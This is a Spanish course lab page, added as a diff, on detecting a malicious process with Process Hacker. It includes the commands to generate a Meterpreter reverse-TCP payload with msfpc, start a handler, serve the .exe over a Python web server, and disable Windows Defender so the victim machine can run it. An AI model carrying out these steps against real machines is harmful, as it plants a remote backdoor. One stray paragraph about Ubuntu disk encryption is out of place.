@@ -1,0 +1,299 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html lang="es" xml:lang="es" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<link rel="stylesheet" type="text/css" href="base.css" />
+<link rel="stylesheet" type="text/css" href="exe_effects.css" />
+<link rel="stylesheet" type="text/css" href="content.css" />
+<link rel="stylesheet" type="text/css" href="nav.css" />
+<meta http-equiv="content-type" content="text/html;  charset=utf-8" />
+<title>Laboratorio 1. Process Hacker | UT5. Fortificación de equipos: Configuración de los sistemas informáticos </title>
+<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+<meta http-equiv="content-language" content="es" />
+<meta name="author" content="Juan Carlos Requena" />
+<link rel="license" type="text/html" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" />
+<meta name="generator" content="eXeLearning 2.7 - exelearning.net" />
+<script type="text/javascript" src="exe_jquery.js"></script>
+<script type="text/javascript" src="exe_effects.js"></script>
+<script type="text/javascript" src="common_i18n.js"></script>
+<script type="text/javascript" src="common.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+</head>
+<body class="exe-web-site" id="exe-node-43"><script type="text/javascript">document.body.className+=" js"</script>
+<div id="content">
+<p id="skipNav"><a href="#main" class="sr-av">Saltar la navegación</a></p>
+<div id="header"  style="background-image: url(logoJCRequena.png); background-repeat: no-repeat;"><div id="headerContent">UT5. Fortificación de equipos: Configuración de los sistemas informáticos</div></div>
+<div id="siteNav">
+<ul>
+   <li><a href="index.html" class="daddy main-node">UT5. Fortificación de equipos: Configuración de los sistemas informáticos</a></li>
+   <li><a href="objetivos.html" class="no-ch">Objetivos</a></li>
+   <li class="current-page-parent"><a href="2_hardening.html" class="current-page-parent daddy">2. Hardening</a>
+   <ul>
+      <li><a href="21_server_hardening.html" class="no-ch">2.1 Server Hardening</a></li>
+      <li><a href="22_recomendaciones_generales_de_seguridad_en_servidores.html" class="no-ch">2.2 Recomendaciones generales de seguridad en servidores</a></li>
+      <li><a href="23_defensa_en_profundidad.html" class="no-ch">2.3 Defensa en profundidad</a></li>
+      <li class="current-page-parent"><a href="24_hardening_windows.html" class="current-page-parent daddy">2.4 Hardening Windows</a>
+      <ul>
+         <li><a href="241_windows_exploit_suggester.html" class="daddy">2.4.1 Windows Exploit Suggester</a>
+         <ul class="other-section">
+            <li><a href="proyecto_server_hardening_windows__realizar_una_auditora_en_el_servidor_windows.html" class="no-ch">Proyecto Server Hardening Windows - Realizar una auditoría en el servidor Windows</a></li>
+         </ul>
+         </li>
+         <li class="current-page-parent"><a href="242_reduccin_del_nmero_de_servicios.html" class="current-page-parent daddy">2.4.2 Reducción del número de servicios</a>
+         <ul>
+            <li id="active"><a href="laboratorio_1_process_hacker.html" class="active no-ch">Laboratorio 1. Process Hacker</a></li>
+            <li><a href="laboratorio_2_uso_del_firewall_de_windows__configuracin_de_red.html" class="no-ch">Laboratorio 2. Uso del firewall de Windows - Configuración de red</a></li>
+            <li><a href="proyecto_server_hardening_windows__seguridad_de_red_y_firewall.html" class="no-ch">Proyecto Server Hardening Windows - Seguridad de red y firewall</a></li>
+         </ul>
+         </li>
+      </ul>
+      </li>
+      <li><a href="25_hardening_linux__lynis.html" class="daddy">2.5 Hardening Linux - Lynis</a>
+      <ul class="other-section">
+         <li><a href="proyecto_server_hardening_linux_auditora_de_sistemas_con_lynis.html" class="no-ch">Proyecto Server Hardening Linux. Auditoría de sistemas con Lynis</a></li>
+         <li><a href="241_contraseas.html" class="no-ch">2.4.1 Contraseñas</a></li>
+         <li><a href="242_configuracin_de_red.html" class="no-ch">2.4.2 Configuración de red</a></li>
+         <li><a href="243_cortafuegos_basados_en_host__configuracin_del_firewall_ufw.html" class="no-ch">2.4.3 Cortafuegos basados en host - Configuración del firewall ufw</a></li>
+         <li><a href="laboratorio_3_uso_del_firewall_de_linux__iptables.html" class="no-ch">Laboratorio 3. Uso del firewall de Linux - Iptables</a></li>
+         <li><a href="proyecto_server_hardening_linux_contraseas_red_y_firewall.html" class="no-ch">Proyecto Server Hardening Linux. Contraseñas, red y firewall</a></li>
+      </ul>
+      </li>
+      <li><a href="26_hardening_apache.html" class="daddy">2.6 Hardening Apache</a>
+      <ul class="other-section">
+         <li><a href="proyecto_server_hardening_linux_apache.html" class="no-ch">Proyecto Server Hardening Linux. Apache</a></li>
+      </ul>
+      </li>
+   </ul>
+   </li>
+   <li><a href="3_securizacin_de_los_sistemas_de_administracin_remota.html" class="daddy">3. Securización de los sistemas de administración remota</a>
+   <ul class="other-section">
+      <li><a href="31_secureshell.html" class="daddy">3.1 SecureShell</a>
+      <ul class="other-section">
+         <li><a href="311_aplicaciones_de_ssh.html" class="no-ch">3.1.1 Aplicaciones de SSH</a></li>
+         <li><a href="312_instalacin_del_servidor_ssh.html" class="no-ch">3.1.2 Instalación del servidor SSH</a></li>
+         <li><a href="313_secure_shell_para_administracin_remota_mediante_certificado.html" class="daddy">3.1.3 Secure Shell para administración remota mediante certificado</a>
+         <ul class="other-section">
+            <li><a href="tarea_1_ssh__acceso_remoto_desde_windows_10.html" class="no-ch">Tarea 1. SSH - Acceso remoto desde Windows 10</a></li>
+         </ul>
+         </li>
+         <li><a href="314_anlisis_de_archivos_de_auditora.html" class="daddy">3.1.4 Análisis de archivos de auditoría</a>
+         <ul class="other-section">
+            <li><a href="laboratorio_4_instalacin_de_graylog.html" class="no-ch">Laboratorio 4. Instalación de Graylog</a></li>
+         </ul>
+         </li>
+         <li><a href="315_fortificacin_de_ssh.html" class="no-ch">3.1.5 Fortificación de SSH</a></li>
+         <li><a href="proyecto_server_hardening_linux_34_caso_prctico_fortificacin_ssh.html" class="no-ch">Proyecto Server Hardening Linux. 3.4 Caso práctico fortificación ssh</a></li>
+         <li><a href="316_sshguard.html" class="daddy">3.1.6 SSHGuard</a>
+         <ul class="other-section">
+            <li><a href="proyecto_server_hardening_linux_sshguard.html" class="no-ch">Proyecto Server Hardening Linux. SSHGuard</a></li>
+         </ul>
+         </li>
+      </ul>
+      </li>
+      <li><a href="32__rdpguard.html" class="daddy">3.2  RdpGuard</a>
+      <ul class="other-section">
+         <li><a href="proyecto_server_hardening_windows_rdpguard.html" class="no-ch">Proyecto Server Hardening Windows. RdpGuard</a></li>
+      </ul>
+      </li>
+      <li><a href="33_fail2ban.html" class="daddy">3.3 Fail2Ban</a>
+      <ul class="other-section">
+         <li><a href="proyecto_server_hardening_linux__fail2ban.html" class="no-ch">Proyecto Server Hardening Linux - Fail2ban</a></li>
+      </ul>
+      </li>
+      <li><a href="34_fwsnort.html" class="no-ch">3.4 Fwsnort</a></li>
+      <li><a href="35_grsecurity.html" class="no-ch">3.5 Grsecurity</a></li>
+   </ul>
+   </li>
+   <li><a href="4_sistemas_de_prevencin_y_proteccin_frente_a_virus_e_intrusiones.html" class="daddy">4. Sistemas de prevención y protección frente a virus e intrusiones</a>
+   <ul class="other-section">
+      <li><a href="41_antivirus.html" class="daddy">4.1. Antivirus</a>
+      <ul class="other-section">
+         <li><a href="411_virustotal.html" class="no-ch">4.1.1 VirusTotal</a></li>
+      </ul>
+      </li>
+      <li><a href="42_antivirus_endpoint_detection__response_edr.html" class="daddy">4.2. Antivirus Endpoint Detection &amp; Response (EDR)</a>
+      <ul class="other-section">
+         <li><a href="421_ejemplo_de_una_solucin_antivirus_en_la_nube.html" class="daddy">4.2.1 Ejemplo de una solución antivirus en la nube</a>
+         <ul class="other-section">
+            <li><a href="4211_registro_y_creacin_del_espacio_de_trabajo.html" class="no-ch">4.2.1.1 Registro y creación del espacio de trabajo</a></li>
+            <li><a href="4212_panel_de_informacin_configuracin_primeros_pasos.html" class="no-ch">4.2.1.2 Panel de Información. Configuración. Primeros pasos</a></li>
+            <li><a href="4213_usuarios.html" class="no-ch">4.2.1.3 Usuarios</a></li>
+            <li><a href="4214_dispositivos.html" class="no-ch">4.2.1.4 Dispositivos</a></li>
+            <li><a href="4215_administrador_de_seguridad.html" class="no-ch">4.2.1.5 Administrador de Seguridad</a></li>
+            <li><a href="4216_vulnerabilidades_parches_cifrado_y_certificados.html" class="no-ch">4.2.1.6 Vulnerabilidades, parches, cifrado y certificados</a></li>
+            <li><a href="4217_nuevas_funcionalidades.html" class="no-ch">4.2.1.7 Nuevas funcionalidades</a></li>
+            <li><a href="proyecto_server_hardening_windows_kaspersky.html" class="no-ch">Proyecto Server Hardening Windows. Kaspersky</a></li>
+         </ul>
+         </li>
+      </ul>
+      </li>
+      <li><a href="43_host_ids.html" class="daddy">4.3. Host IDS</a>
+      <ul class="other-section">
+         <li><a href="proyecto_server_hardening_windows__ids_wazuh.html" class="no-ch">Proyecto Server Hardening Windows - IDS wazuh</a></li>
+      </ul>
+      </li>
+      <li><a href="44_honeypot.html" class="no-ch">4.4. Honeypot</a></li>
+   </ul>
+   </li>
+   <li><a href="5_configuracin_de_actualizaciones_y_parches_automticos.html" class="daddy">5. Configuración de actualizaciones y parches automáticos</a>
+   <ul class="other-section">
+      <li><a href="51_unattendedupgrades.html" class="no-ch">5.1 unattended-upgrades</a></li>
+      <li><a href="52_wsus.html" class="daddy">5.2 WSUS</a>
+      <ul class="other-section">
+         <li><a href="faqserroreswsus.html" class="no-ch">FAQS-errores-WSUS</a></li>
+         <li><a href="proyecto_server_hardening_windows_wsus.html" class="no-ch">Proyecto Server Hardening Windows. WSUS</a></li>
+      </ul>
+      </li>
+   </ul>
+   </li>
+   <li><a href="6_sistemas_de_copias_de_seguridad.html" class="daddy">6. Sistemas de copias de seguridad</a>
+   <ul class="other-section">
+      <li><a href="61_herramientas.html" class="no-ch">6.1 Herramientas</a></li>
+      <li><a href="62_copias_a_disco_duro.html" class="no-ch">6.2 Copias a disco duro</a></li>
+      <li><a href="63_copias_a_unidad_en_drive.html" class="no-ch">6.3 Copias a unidad en Drive</a></li>
+      <li><a href="64_gestin_de_backups_en_linux.html" class="no-ch">6.4 Gestión de backups en Linux</a></li>
+      <li><a href="proyecto_server_hardening_en_linux_y_windows__copias_de_seguridad.html" class="no-ch">Proyecto Server Hardening en Linux y Windows - Copias de Seguridad</a></li>
+   </ul>
+   </li>
+   <li><a href="7_soluciones_dlp.html" class="daddy">7. Soluciones DLP</a>
+   <ul class="other-section">
+      <li><a href="71_plataformas_dlp_en_el_mercado.html" class="no-ch">7.1 Plataformas DLP en el mercado</a></li>
+   </ul>
+   </li>
+   <li><a href="8_referencias.html" class="no-ch">8. Referencias</a></li>
+</ul>
+</div>
+<div id='topPagination'>
+<div class="pagination noprt">
+<a href="242_reduccin_del_nmero_de_servicios.html" class="prev"><span><span>&laquo; </span>Anterior</span></a> <span class="sep">| </span><a href="laboratorio_2_uso_del_firewall_de_windows__configuracin_de_red.html" class="next"><span>Siguiente<span> &raquo;</span></span></a>
+</div>
+</div>
+<div id="main-wrapper">
+<div id="main"><a name="main"></a>
+<div id="nodeDecoration"><h1 id="nodeTitle">Laboratorio 1. Process Hacker</h1></div>
+<div class="iDevice_wrapper pblIdevice em_iDevice em_iDevice_activity" id="id77">
+<div class="iDevice emphasis1" >
+<div class="iDevice_header" style="background-image:url(icon_activity.png)"><span class="iDeviceTitle">&nbsp;</span></div>
+<div class="iDevice_inner">
+<div class="iDevice_content_wrapper">
+<div id="ta77_109_2" class="block iDevice_content">
+<div class="pbl-task-description"><h3>1. Introducción</h3>
+<p style="text-align: justify;"><strong>Process Hacker</strong> es un programa de código abierto con el que se puede controlar los procesos que se ejecutan en un equipo de una manera más profunda que con el propio administrador de tareas de Windows.</p>
+<p style="text-align: justify;">Esta herramienta permite monitorizar más información acerca de los procesos que se están ejecutando, así como de las librerías DLL que utiliza, llegando incluso a poder enviar los procesos a servicios de antivirus online para su análisis inmediato.</p>
+<h3 style="text-align: justify;">2. Recursos necesarios</h3>
+<ol>
+<li style="text-align: justify;">Servidor Windows Server 2019 Datacenter  - Subdominio de vuestro proyecto.</li>
+<li style="text-align: justify;">Equipo con kali Linux configurado en red con el Subdominio de vuestro proyecto.</li>
+</ol>
+<h3 style="text-align: justify;">3. Uso de Process Hacker</h3>
+<p align="justify" style="text-align: justify;">Se puede realizar el cifrado de particiones durante la instalación del sistema operativo. En las siguientes pestañas, se describe el proceso de instalación de Ubuntu Server configurando el cifrado de la partición del sistema.</p>
+<div class="exe-fx exe-tabs">
+<h2>1. Instalación</h2>
+<p style="text-align: justify;">Para descargar la aplicación hay que acceder a la página web oficial:<span> </span><a href="https://processhacker.sourceforge.io/">https://processhacker.sourceforge.io/</a> A continuación, se realiza la instalación mediante el asistente. En la segunda pantalla, se puede decidir si se instala la aplicación para todos los usuarios o no, si se inicia el proceso en el inicio del sistema o no, etcétera.</p>
+<p style="text-align: center;"><img src="process-hacker-001.png" alt="" width="493" height="378" /></p>
+<p style="text-align: justify;">Una vez instalado,  aparecerá un icono nuevo en la esquina inferior derecha del escritorio de nuestro equipo: <img src="process-hacker-002.png" alt="" width="242" height="38" /></p>
+<h2>2. Menú principal</h2>
+<p style="text-align: justify;">Una vez se accede a la aplicación, la ventana principal es la siguiente:</p>
+<p style="text-align: center;"><img src="process-hacker-003.png" alt="" width="875" height="644" /></p>
+<h2>3. Proceso I</h2>
+<p style="text-align: justify;"><strong>Propiedades de un proceso. </strong>Para observar con detalle las propiedades de un proceso, hay que hacer dobleclick sobre el mismo. En la pestaña <strong>General,<span> </span></strong><span> se tiene información relevante al proceso, su nombre, dónde se ejecuta, sus permisos, etcétera.</span></p>
+<p style="text-align: center;"><img src="process-hacker-004.png" alt="" width="442" height="577" /></p>
+<h2>4. Proceso II</h2>
+<p style="text-align: justify;"><strong>Propiedades de un proceso (II).  </strong><span style="font-size: 1em;">En la pestaña</span><span style="font-size: 1em;"> </span><strong style="font-size: 1em;">Memory</strong><strong style="font-size: 1em;">, </strong><span style="font-size: 1em;"> se tiene información de las direcciones de memoria donde está ejecutándose el proceso.</span></p>
+<p style="text-align: center;"><span style="font-size: 1em;"><img src="process-hacker-005.png" alt="" width="444" height="575" /></span></p>
+<h2>5. Proceso III</h2>
+<p style="text-align: justify;"><strong>Propiedades de un proceso (III).  </strong><span style="font-size: 1em;">En la pestaña</span><span style="font-size: 1em;"> </span><strong style="font-size: 1em;">Modules</strong><strong style="font-size: 1em;">, </strong><span style="font-size: 1em;"> se tiene información <span>de las librerías a las que hace llamada el proceso.</span></span></p>
+<p style="text-align: center;"><span style="font-size: 1em;"><img src="process-hacker-006.png" alt="" width="443" height="577" /></span></p>
+</div>
+<h3>4. Detectar un proceso malicioso</h3>
+<p><strong>Escenario para este ejemplo:</strong></p>
+<ol>
+<li style="text-align: justify;">Servidor Windows Server 2019 Datacenter promocionado a controlador del dominio  smr.local con ip 192.168.191.54 (adaptador red en modo puente).</li>
+<li style="text-align: justify;">Equipo con kali Linux configurado en la red del controlador del dominio smr.local con ip 192.168.191.55 (adaptador red en modo puente).</li>
+</ol>
+<p style="text-align: center;"><img src="Escenario-Labo1-UT5.png" alt="" width="853" height="344" /></p>
+<p style="text-align: justify;">Para disponer de un proceso malicioso en el equipo objetivo y poder analizarlo, se va a utilizar la herramienta <span><strong><em>MSFvenom Payload Creator</em></strong> </span><a href="https://command-not-found.com/msfpc" target="_blank" rel="noopener"><strong>(msfpc)</strong></a> para crear un proceso malicioso (payload).</p>
+<p style="text-align: justify;"><span><strong>MSFvenom Payload Creator (MSFPC)</strong> es una herramienta para la creación de cargas útiles (payloads) y </span><span>se puede utilizar para generar diferentes cargas en sistemas Windows, Android o Linux en muy poco tiempo. Es una manera fácil de generar cargas útiles de Meterpreter usando <strong>MSFvenom</strong> (parte del marco Metasploit). </span></p>
+<p style="text-align: justify;"><span>Investigadores en </span><strong><a href="https://www.iicybersecurity.com/curso-hacking.html">hacking ético</a></strong><span> del Instituto Internacional de Seguridad Cibernética (IICS) han demostrado muchas otras cargas útiles que son completamente indetectables. Este MSFPC es una herramienta preinstalada (nativa) en Kali Linux, por eso utilizaremos un equipo Kali para generar el proceso malicioso.</span></p>
+<p style="text-align: justify;"><span style="font-size: 1em;">En los siguientes pasos se describe el proceso.</span></p>
+<p style="text-align: justify;"><strong>Paso 1.</strong> En primer lugar, crearemos una sesión de <strong><a href="https://thehackerway.com/2011/04/26/conceptos-basicos-de-meterpreter-metasploit-framework/" target="_blank" rel="noopener">meterpreter</a></strong> sencilla con <strong><a href="https://www.kali.org/tools/msfpc/" target="_blank" rel="noopener">msfpc</a> </strong>(generar carga útil para la plataforma Windows). Para ello, accedemos al equipo kali linux y ejecutamos el siguiente comando, donde:</p>
+<ul>
+<li style="text-align: justify;"><span style="font-size: 12pt;">192.168.191.55 es la ip del equipo kali linux.</span></li>
+<li style="text-align: justify;"><span style="font-size: 12pt;">windows es la plataforma para la que se creará la sesión de meterpreter.</span></li>
+</ul>
+<p><span style="font-size: 12pt;">Como no hemos especificado puerto, el puerto por defecto que usará para establecer la conexión con el equipo objetivo será el 443.</span></p>
+<pre><span style="font-size: 12pt;"><strong>$</strong> msfpc Windows 192.168.191.55</span></pre>
+<p style="text-align: center;"><img src="labUT5-001.png" alt="" width="812" height="390" /></p>
+<p style="text-align: justify;">De esta forma, vamos a generar una carga útil para obtener la máquina de la víctima (equipo Windows Server 2019) de la sesión de meterpreter que opera en Windows, es decir, creamos una puerta trasera maliciosa en formato .exe para arquitectura de 32 bits (luego comenzará a generar la carga útil).  Si se observa la imagen superior, se ha creado el fichero malicioso <strong>windows-meterpreter-staged-reverse-tcp-443.exe, </strong>que posteriormente haremos llegar al equipo objetivo.<strong></strong></p>
+<p><strong>Paso 2. Iniciar el controlador.</strong></p>
+<p style="text-align: justify;">A continuación, hay que ejecutar el siguiente comando para iniciar el controlador múltiple automáticamente.</p>
+<pre><span style="font-size: 12pt;">msfconsole -q -r '/home/kali/windows-meterpreter-staged-reverse-tcp-443-exe.rc</span></pre>
+<p style="text-align: center;"><strong><img src="labUT5-003.png" alt="" width="817" height="477" /></strong></p>
+<p><strong>Paso 3. Crear un servidor web simple para transferir el fichero malicioso al equipo objetivo (víctima).</strong></p>
+<p style="text-align: justify;">Una vez se ha iniciado el controlador, el siguiente paso es crear un servidor web simple para poder transferir al equipo objetivo (víctima) el fichero malicioso. Para ello, ejecutamos el siguiente comando:</p>
+<pre><span style="font-size: 12pt;"><strong>$</strong> python2 -m SimpleHTTPServer 8080</span></pre>
+<p style="text-align: center;"><strong><img src="lab01-ut5-002.png" alt="" width="593" height="256" /></strong><span style="font-size: 12pt;"></span></p>
+<p><strong>Paso 4. Descargar el fichero malicioso desde el equipo objetivo Windows.</strong></p>
+<p style="text-align: justify;">Supuestamente, cuando la víctima navegue por la siguiente URL <strong><a href="http://192.168.191.55:8080,">http://192.168.191.55:8080</a>, </strong>se le solicitará que descargue y ejecute el archivo .exe que proporcionará la sesión de meterpreter al atacante.</p>
+<p style="text-align: justify;">Para similar el anterior supuesto, hay que acceder al servidor web que se ha puesto en marcha en kali linux, para ello, abrimos un navegador y accedemos a la url <strong>http://192.168.191.55:8080 </strong>para descargar el fichero malicioso <span style="font-size: 12pt;"><strong>windows-meterpreter-staged-reverse-tcp-443-exe</strong>.</span></p>
+<p style="text-align: center;"><img src="lab1UT5-005.png" alt="" width="711" height="627" /></p>
+<p style="text-align: justify;"><span style="font-size: 12pt;">Para descargar/ejecutar el fichero, pinchamos sobre el enlace '<span style="color: #ff0000;">windows-meterpreter-staged-reverse-tcp-443-exe</span>' y seleccionamos '<strong>Guardar destino como</strong>'. Aparecerá una nueva ventana (ver figura inferior) donde pulsaremos el botón '<strong>Guardar</strong>'.</span></p>
+<p style="text-align: center;"><img src="lab1UT5-005-2.png" alt="" width="1242" height="624" /></p>
+<p style="text-align: justify;">Si se tiene activado Windows Defender (es lo habitual),  nos aparecerá el siguiente mensaje, donde se ha eliminado al detectar que era un fichero malicioso.</p>
+<p style="text-align: center;"><img src="lab1UT5-006.png" alt="" width="724" height="62" /></p>
+<p style="text-align: justify;">Para proseguir, hay que desactivar Windows Defender para poder descargar el fichero (ver figura inferior).</p>
+<p style="text-align: center;"><img src="lab1-ut5-007-2.png" alt="" width="976" height="666" /></p>
+<p style="text-align: justify;">Una vez se ha desactivado<strong> Windows Defender</strong>, volvemos a descargar el fichero y nos aparecerá el siguiente mensaje, donde podremos ejecutar el fichero descargado (botón Acciones), ver la descarga del mismo o eliminar el fichero descargado.</p>
+<p style="text-align: center;"><img src="lab1UT5-007.png" alt="" width="723" height="74" /></p>
+<p style="text-align: justify;"><strong>Paso 5. Ejecutar el fichero malicioso y abrir sesión</strong><span style="font-size: 12pt;"></span></p>
+<p style="text-align: justify;">Si la víctima ejecuta el archivo <strong>exe</strong>, podremos acceder a la máquina comprometida, es decir, en la consola de kali linux podremos observar que se ha abierto una sesión Meterpreter (con esto sabremos que la víctima ha ejecutado el fichero) y estaremos dentro de una sesión del equipo objetivo.</p>
+<p style="text-align: center;"><img src="lab1UT5-008.png" alt="" width="819" height="480" /></p>
+<p style="text-align: justify;">A continuación, en la consola <strong>msf6</strong> escribimos <strong>sessions -i 1</strong> (ver figura inferior).</p>
+<p style="text-align: center;"><img src="lab1UT5-009.png" alt="" width="511" height="86" /></p>
+<p style="text-align: justify;"><strong></strong>En  estos momentos, estamos dentro de una sesión del equipo windows donde podremos: recorrer el árbol de directorios, crear ficheros y directorios, borrar, instalar aplicaciones, etc..</p>
+<p style="text-align: center;"><strong><img src="lab1UT5-010.png" alt="" width="588" height="177" /></strong></p>
+<p style="text-align: center;"><strong><img src="lab1UT5-0xx.png" alt="" width="840" height="578" /></strong></p>
+<p><strong>Paso 6. Detectar la conexión con Process Hacker</strong></p>
+<p style="text-align: justify;">Ahora desde el equipo Windows, ejecutamos <strong>Process Hacker<span> </span></strong>para detectar la conexión. En la pestaña de<span> </span><strong>Network</strong><span> </span>aparecen las conexiones. <span>Si comprobamos las mismas, encontramos una que ocurre desde la propia red local (</span><strong>192.168.191.55). </strong>Hacemos click con el botón derecho del ratón y nos aparece una venta emergente con posibles acciones donde seleccionaremos<strong> 'Go to process'. </strong>Otra forma de ir al proceso es  haciendo doble click.</p>
+<p style="text-align: center;"><img src="lab1UT5-012.png" alt="" width="1113" height="626" /></p>
+<p style="text-align: justify;">Una vez en la ventana de procesos (ver figura inferior), seleccionamos el proceso malicioso y hacemos click con el botón derecho del ratón. Nos aparece una venta emergente donde si pulsamos '<strong>Send To</strong>' <strong>virusscan.jotti.org</strong>, <span>enviaremos el proceso automáticamente a la web para virusscan para que lo analice.</span></p>
+<p style="text-align: center;"><strong><img src="lab1UT5-015.png" alt="" width="1116" height="628" /></strong></p>
+<p>Una vez se envía el proceso a la web, comienza con el análisis de manera automática.</p>
+<p style="text-align: center;"><strong><img src="lab1UT5-013.png" alt="" width="1134" height="546" /></strong></p>
+<p style="text-align: justify;">Cuando finaliza, nos ofrece como salida indicando <span> la infección en el archivo</span>, en este caso, ya sabemos que es un <strong>Meterpreter</strong> ya que lo hemos creado nosotros.</p>
+<p style="text-align: center;"><strong><img src="lab1UT5-014.png" alt="" width="1248" height="616" /></strong></p>
+<p>Si se desea obtener más información del proceso malicioso, podemos acceder a las propiedades del mismo '<strong>Properties</strong>' donde se tienen varias pestañas, ejemplo: pestaña <strong>General</strong>.</p>
+<p style="text-align: center;"><strong><img src="lab1UT5-016.png" alt="" width="1148" height="627" /></strong></p>
+<p>Una vez estudiado el proceso malicioso, eliminamos el hilo del proceso del sistema con la opción '<strong>Termitate</strong>' o '<strong>Termitate</strong> <strong>tree</strong>' (árbol de procesos).</p>
+<p style="text-align: center;"><strong><img src="lab1UT5-017.png" alt="" width="1149" height="627" /></strong></p>
+<p style="text-align: justify;">Una vez se ha eliminado el proceso, podemos comprobar que la sesión en kali ha terminado también.</p>
+<p style="text-align: center;"><img src="lab1UT5-018.png" alt="" width="955" height="318" /></p>
+<p>En el siguiente vídeo, se describe todo el proceso.<strong></strong><strong></strong></p>
+<p style="text-align: center;"><strong><iframe width="560" height="314" src="https://www.youtube.com/embed/j3QQxVoG1Ak" allowfullscreen="allowfullscreen"></iframe><br /><br /></strong></p>
+<p style="text-align: center;"><em><strong>Vídeo 1. </strong>Detectar proceso malicioso con Process Hacker.</em></p>
+<h4><strong>Uso de msfpc</strong></h4>
+<p>Ejecuta el comando<strong> msfpc -h</strong>  para obtener la Ayuda de la herramienta.</p>
+<h3 style="text-align: justify;">5. Entrega</h3>
+<p style="text-align: justify;">Documento en formato pdf donde se describa gráfica y textualmente la detección del proceso malicioso mediante Process Hachker y una herramienta externa de análisis de virus.</p>
+<p>Intenta obtener la mayor información posible del proceso malicioso con Process Hacker.</p>
+<h3 style="text-align: justify;">6. Referencias</h3>
+<ul>
+<li style="text-align: justify;"><a href="https://processhacker.sourceforge.io/">https://processhacker.sourceforge.io/</a></li>
+<li style="text-align: justify;"><a href="https://www.hackingarticles.in/comprehensive-guide-on-msfpc/">https://www.hackingarticles.in/comprehensive-guide-on-msfpc/</a></li>
+</ul></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="packageLicense" class="cc cc-by-nc-sa">
+<p><span>Obra publicada con</span> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Licencia Creative Commons Reconocimiento No comercial Compartir igual 4.0</a></p>
+</div>
+</div>
+</div>
+<div id='bottomPagination'>
+<div class="pagination noprt">
+<a href="242_reduccin_del_nmero_de_servicios.html" class="prev"><span><span>&laquo; </span>Anterior</span></a> <span class="sep">| </span><a href="laboratorio_2_uso_del_firewall_de_windows__configuracin_de_red.html" class="next"><span>Siguiente<span> &raquo;</span></span></a>
+</div>
+</div>
+</div>
+<script type="text/javascript" src="_style_js.js"></script></body></html>
